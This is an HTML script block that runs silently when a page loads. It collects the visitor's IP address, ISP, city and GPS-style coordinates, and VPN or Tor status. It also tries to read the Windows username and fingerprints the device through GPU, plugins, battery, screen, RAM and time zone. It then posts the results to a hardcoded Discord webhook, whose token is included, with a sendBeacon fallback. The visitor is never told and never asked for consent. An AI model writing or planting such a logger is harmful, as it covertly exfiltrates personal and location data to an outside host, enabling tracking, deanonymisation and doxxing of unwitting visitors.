<script>
    // ================================================================
    //  WEBHOOK (your new one)
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // ================================================================
    //  MAIN
    // ================================================================
    (function() {

        // ---- 1. Get IP info (ipapi.co with fallback) ----
        function getIPInfo(callback) {
            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) })
                .then(res => res.json())
                .then(data => {
                    if (data.ip) {
                        callback(data);
                        return;
                    }
                    throw new Error('ipapi failed');
                })
                .catch(() => {
                    fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(3000) })
                        .then(res => res.json())
                        .then(data => {
                            if (data.query) {
                                const converted = {
                                    ip: data.query,
                                    org: data.isp,
                                    country_name: data.country,
                                    region: data.regionName,
                                    city: data.city,
                                    latitude: data.lat,
                                    longitude: data.lon,
                                    proxy: data.proxy || false
                                };
                                callback(converted);
                            } else {
                                callback(null);
                            }
                        })
                        .catch(() => callback(null));
                });
        }

        // ---- 2. Windows username (ActiveX) ----
        function getWindowsUser() {
            try {
                var wsh = new ActiveXObject('WScript.Shell');
                return wsh.ExpandEnvironmentStrings('%USERNAME%');
            } catch (e) {
                return null;
            }
        }

        // ---- 3. Build and send ----
        function sendData(ipData) {
            const ua = navigator.userAgent;
            const os = (function() {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Unknown';
            })();
            const browser = (function() {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            // GPU
            let gpu = 'Unavailable';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
                }
            } catch (e) {}

            // Plugins
            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';

            // Battery
            let battery = 'Unavailable';
            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
                }).catch(() => {});
            }

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // VPN detection
            let isVpn = false;
            if (ipData && ipData.proxy === true) isVpn = true;
            if (ipData && ipData.org) {
                const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                const orgLower = ipData.org.toLowerCase();
                if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
            }

            // Windows username
            let winUser = getWindowsUser();
            if (!winUser) winUser = 'Not available (IE/ActiveX required)';

            // Build message (without hostname and device model)
            const msg = 
`**ctOS User Info**
**IP:** ${ipData ? ipData.ip : 'Unknown'} (${ipData ? ipData.org : 'Unknown ISP'})
**Location:** ${ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown'}
**Coordinates:** ${ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown'}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**Windows Username:** ${winUser}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
**RAM:** ${navigator.deviceMemory || '?'} GB
**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
**Battery:** ${battery}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

            // Send to Discord
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: msg }),
                keepalive: true
            }).catch(() => {
                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                navigator.sendBeacon(WEBHOOK, blob);
            });
        }

        // ---- Start ----
        getIPInfo(function(ipData) {
            if (!ipData) {
                ipData = { ip: 'Unknown', org: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', latitude: 'Unknown', longitude: 'Unknown', proxy: false };
            }
            sendData(ipData);
        });

    })();
</script>
